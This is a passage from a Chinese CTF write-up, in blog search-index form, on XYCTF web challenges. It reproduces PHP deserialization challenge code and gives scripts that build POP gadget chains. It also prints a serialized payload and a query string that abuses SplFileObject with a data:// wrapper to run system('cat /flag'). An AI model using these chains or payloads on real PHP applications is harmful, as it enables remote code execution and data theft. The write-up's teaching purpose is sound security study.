class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mack-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;o.O&lt;br&gt;&quot;</span>;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;luo;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$wang1</span>,<span class="hljs-variable">$wang2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag2</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;O.o&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$this</span>-&gt;lao-&gt;chen) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-variable language_">$this</span>-&gt;lao-&gt;chen;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-variable language_">$this</span>-&gt;num!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>静下来分析以下其实第二层也不算太难的还是从后往前推，关键应该在echo $flag2这里</p><p>调用一个不存在的函数可以调用__call()，也就是$this-&gt;mack-&gt;nonExistentMethod();</p><p>__invoke()把对象当成函数就可以调用，return $function()可以解决这个问题。</p><p>__get调用不存在的属性，return is_null($this-&gt;lao-&gt;chen) ? “” : $this-&gt;lao-&gt;chen;可以解决。</p><p>__toString有echo就行，调用__unserialize($data) ,里面的，值得注意的是我看了其他师傅的wp，好像因为php版本问题，这里不能用，下面的wakeup也是可以调用的，分析完我罗列一下。</p><p>E::__wakeup-&gt;D::__tostring-&gt;B::__get-&gt;A::__invoke-&gt;C::__call;</p><p>我们尝试写一下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mack</span>;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$luo</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-variable">$wang1</span>; <br>       &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$lao</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$chen</span>; <br>        &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span> </span>&#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;xxxxx&quot;</span>;<br>            <span class="hljs-keyword">public</span> <span class="hljs-variable">$num</span>; <br>            &#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> E;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> D;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> B;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> A;<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> C;<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;lao=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span>-&gt;luo=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span>-&gt;mack=<span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="/../images/xyctf/ser1.png" alt="ser1"></p><p>写完一遍发现也不是很难，看看第三层，先贴代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$Liu</span>, <span class="hljs-variable">$T1ng</span>, <span class="hljs-variable">$upsw1ng</span> = Showmaker</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Liu = <span class="hljs-variable">$Liu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;T1ng = <span class="hljs-variable">$T1ng</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;upsw1ng = <span class="hljs-variable">$upsw1ng</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$crypto0</span>, <span class="hljs-variable">$adwa</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;crypto0 = <span class="hljs-variable">$crypto0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XYCTF</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="hljs-string">&#x27;dev1l&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$KickyMu</span>, <span class="hljs-variable">$fpclose</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;KickyMu = <span class="hljs-variable">$KickyMu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fpclose = <span class="hljs-variable">$fpclose</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XY</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;N1ght == <span class="hljs-string">&#x27;oSthing&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;WOW, You web is really good!!!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;KickyMu-&gt;<span class="hljs-title function_ invoke__">XYCTF</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">XY</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>好多出题人被扒上面啊，该打呜呜呜。</p><p>看了一遍好难，原生链和利用链，跟着师傅的思路跑一遍。</p><p>？写多了我感觉也不是太难了，上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO3</span>;<br><span class="hljs-variable">$a</span>-&gt;N1ght=<span class="hljs-string">&#x27;oSthing&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO2</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO1</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;T1ng=<span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这里注意有private，需要%00填上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">$this-&gt;adwa-&gt;crypto0 != &#x27;dev1l&#x27;的原因还需要添s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?CTF=O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO3&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;KickyMu&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO2&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;adwa&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO1&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Liu&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;T1ng&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;yuroandCMD258&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;%00XYCTFNO1%00upsw1ng&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dev1l&quot;</span>;&#125;&#125;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;fpclose&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;N1ght&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;oSthing&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>post里面y肯定是构造伪协议这没什么问题，x的话我就不太懂了，<a href="https://blog.csdn.net/weixin_39534780/article/details/115514259?ops_request_misc=&request_id=&biz_id=102&utm_term=SplFileObject&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-115514259.nonecase&spm=1018.2226.3001.4187">文章</a>，简要了解一下，类似file_get_contents，这里前面有new,可以用Splfileobject使用，确实长知识了。</p><p><img src="/../images/xyctf/ser2.png" alt="ser2"></p><p><img src="/../images/xyctf/ser3.png" alt="ser3"></p><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure><p>看了一下wp也是考的Spl原生类+伪协议利用，确实之前不知道这些。</p><p>?a&#x3D;SplFileObject&amp;aa&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,system&amp;c&#x3D;__toString&amp;b&#x3D;SplFileObject&amp;bb&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,cat%20&#x2F;flag</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>没遇过的知识点，可以看看，<a href="https://xz.aliyun.com/t/14061?time__1311=mqmx9DBG0Qi=oGNDQiiQGkfD8QaR10B4OiD&alichlgref=https://cn.bing.com/">前置知识</a></p><p>之后可以看官p,太难了技术有限。就到这里了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
